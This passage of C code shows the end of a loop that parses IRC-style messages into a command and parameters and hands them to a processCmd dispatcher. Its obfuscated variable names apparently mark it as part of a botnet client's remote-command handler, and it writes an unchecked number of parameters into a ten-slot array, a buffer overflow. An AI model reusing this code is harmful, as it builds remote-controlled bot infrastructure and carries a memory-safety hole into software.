                                while(*nickMask != ' ' && *nickMask != 0x00) nickMask++;
                                if(*nickMask == 0x00) continue;
                                *(nickMask) = 0x00;
                                nickMask = m3ss4ge + 1;

                                m3ss4ge = m3ss4ge + strlen(nickMask) + 2;
                                while(m3ss4ge[strlen(m3ss4ge) - 1] == '\n' || m3ss4ge[strlen(m3ss4ge) - 1] == '\r') m3ss4ge[strlen(m3ss4ge) - 1] = 0x00;

                                unsigned char *command = m3ss4ge;
                                while(*m3ss4ge != ' ' && *m3ss4ge != 0x00) m3ss4ge++;
                                *m3ss4ge = 0x00;
                                m3ss4ge++;

                                unsigned char *tCpc0mm4nd = command;
                                while(*tCpc0mm4nd) { *tCpc0mm4nd = toupper(*tCpc0mm4nd); tCpc0mm4nd++; }

                                unsigned char *params[10];
                                int paramsCount = 1;
                                unsigned char *pch = strtok(m3ss4ge, " ");
                                params[0] = command;

                                while(pch)
                                {
                                        if(*pch != '\n')
                                        {
                                                params[paramsCount] = (unsigned char *)malloc(strlen(pch) + 1);
                                                memset(params[paramsCount], 0, strlen(pch) + 1);
                                                strcpy(params[paramsCount], pch);
                                                paramsCount++;
                                        }
                                        pch = strtok(NULL, " ");
                                }

                                processCmd(paramsCount, params);

                                if(paramsCount > 1)
                                {
                                        int q = 1;
                                        for(q = 1; q < paramsCount; q++)
                                        {
                                                free(params[q]);
                                        }
                                }
                        }
                }
               
        }

        return 0;
}
